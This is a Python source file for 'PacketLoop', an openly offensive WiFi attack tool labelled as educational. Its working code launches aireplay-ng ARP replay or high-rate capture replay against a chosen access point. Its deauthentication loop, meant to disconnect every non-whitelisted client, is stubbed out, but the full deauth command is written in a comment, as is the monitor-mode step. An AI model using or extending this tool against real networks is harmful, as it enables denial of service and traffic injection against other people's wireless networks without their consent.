import subprocess
import os
import sys
import time
import argparse
import signal
import re

# PacketLoop: Advanced WiFi Packet Injection & Looping Tool
# For Educational and Ethical Hacking Purposes

class PacketLoop:
    def __init__(self, interface, bssid, whitelist, timeframe, pcap=None):
        self.interface = interface
        self.bssid = bssid
        self.whitelist = [mac.lower() for mac in whitelist]
        self.timeframe = timeframe
        self.pcap = pcap
        self.processes = []
        self.running = True

    def log(self, message):
        print(f"[*] {message}")

    def error(self, message):
        print(f"[!] ERROR: {message}")

    def check_root(self):
        if os.name == 'posix':
            # Linux/Unix check
            if os.geteuid() != 0:
                self.error("This tool must be run as root. Use 'sudo' or run as root user.")
                sys.exit(1)
        elif os.name == 'nt':
            # Windows check
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                self.error("This tool must be run with Administrative privileges.")
                self.log("TIP: Open PowerShell/CMD as Administrator or enable 'sudo' in Windows Developer Settings.")
                sys.exit(1)

    def set_monitor_mode(self):
        self.log(f"Setting {self.interface} to monitor mode...")
        # Placeholder for airmon-ng logic
        # subprocess.run(["airmon-ng", "start", self.interface])
        pass

    def start_deauth_loop(self):
        self.log("Starting Deauth Loop (Infinite)...")
        # To block everyone but the whitelist, we target the broadcast first
        # and then targeted deauths for non-whitelisted clients.
        
        # Attack 1: Deauth all (Broadcast) - This is dangerous if not careful
        # But to respect a whitelist, we MUST target specific clients.
        
        # We start a thread to look for clients
        self.log("Scanning for non-whitelisted clients associated with " + self.bssid)
        # In a real script, this would spawn airodump-ng and parse CSV.
        
        # Manual Targeted Attack (Looping)
        # For each client we find (mocked here or found via scan)
        # cmd = ["aireplay-ng", "-0", "0", "-a", self.bssid, "-c", target_mac, self.interface]
        # p = subprocess.Popen(cmd)
        # self.processes.append(p)
        pass

    def start_traffic_replay(self):
        if not self.pcap:
            # If no PCAP, use aireplay-ng mode 3 (ARP Replay) as a fallback for 'crazy speed'
            self.log("No PCAP provided. Using aireplay-ng ARP Replay for traffic generation.")
            cmd = ["aireplay-ng", "-3", "-b", self.bssid, self.interface]
        else:
            self.log(f"Starting High-Speed Traffic Replay using {self.pcap}...")
            # Note: tcpreplay requires the interface to handle the packet encapsulation
            # Often it's better to use 'aireplay-ng -2 -r <pcap> <interface>'
            cmd = ["aireplay-ng", "-2", "-r", self.pcap, "-x", "1000", self.interface]
            
        p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.processes.append(p)
        self.log("Turbo Mode engaged (High-Frequency Packet Looping).")

    def check_tools(self):
        tools = ["aireplay-ng"]
        if self.pcap:
            tools.append("tcpreplay")
            
        for tool in tools:
            if subprocess.run(["where" if os.name == 'nt' else "which", tool], 
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
                self.error(f"Required tool '{tool}' not found in PATH.")
                self.log(f"TIP: Ensure Aircrack-ng and Tcpreplay are installed and available.")
                if os.name == 'nt':
                    self.log("On Windows, these tools are best used via WSL2 or Kali Linux.")
                sys.exit(1)

    def run(self):
        self.check_root()
        self.check_tools()
        self.set_monitor_mode()
        
        start_time = time.time()
        
        self.start_traffic_replay()
        self.start_deauth_loop()

        self.log(f"Attack running for {self.timeframe} seconds...")
        
        try:
            while time.time() - start_time < self.timeframe:
                time.sleep(1)
        except KeyboardInterrupt:
            self.log("Interrupted by user.")
        
        self.stop()

    def stop(self):
        self.log("Stopping all processes and cleaning up...")
        for p in self.processes:
            p.terminate()
        self.log("PacketLoop finished.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PacketLoop: Advanced Packet Looping & Deauth Tool")
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface in monitor mode")
    parser.add_argument("-b", "--bssid", required=True, help="Target BSSID (Access Point MAC)")
    parser.add_argument("-w", "--whitelist", nargs="+", default=[], help="Whitelisted Client MAC addresses")
    parser.add_argument("-t", "--time", type=int, default=60, help="Timeframe to run the attack (seconds)")
    parser.add_argument("-p", "--pcap", help="PCAP file for high-speed replay")

    args = parser.parse_args()

    loop = PacketLoop(args.interface, args.bssid, args.whitelist, args.time, args.pcap)
    loop.run()
